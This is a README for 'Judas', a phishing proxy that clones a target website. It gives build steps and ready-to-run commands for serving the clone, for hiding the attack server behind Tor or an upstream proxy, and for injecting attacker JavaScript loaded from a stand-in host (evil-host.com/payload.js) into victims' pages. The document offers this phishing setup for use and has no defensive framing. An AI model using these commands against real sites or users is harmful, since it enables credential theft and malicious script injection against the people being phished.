Judas
=====
Judas is a phishing proxy.
It can clone a website passed to it using command line flags.

Building
--------
To build `judas`, simply run `go build`.
 ```
 go build -o judas cmd/judas.go
 ```


Usage
-----
The target ```--target``` flag is required.
By default, `judas` requires a path to a SSL certificate (```--cert```) and a SSL private key (```--private-key```).
If you want to listen using HTTP, pass the ```--insecure``` flag.
If you want to accept self-signed SSL certificate from target host, pass the ```--insecure-target``` flag.

Example:
```
./judas --target https://target-url.com --cert server.crt --private-key server.key
```

```
./judas --target https://target-url.com --insecure
```

```
./judas --target https://target-url-with-self-signed-cert.com --insecure-target
```


It can optionally use an upstream proxy with the ```--proxy``` argument to proxy Tor websites or hide the attack server from the target.

Example:
```
./judas --target https://torwebsite.onion --cert server.crt --private-key server.key --proxy localhost:9150
```

By default, Judas listens on localhost:8080.
To change this, use the ```--address``` argument.

Example:
```
./judas --target https://target-url.com --cert server.crt --private-key server.key --address=0.0.0.0:8080
```

Judas can also inject custom JavaScript into requests by passing a URL to a JS file with the ```--inject-js``` argument.

Example:
```
./judas --target https://target-url.com --cert server.crt --private-key server.key --inject-js https://evil-host.com/payload.js
```
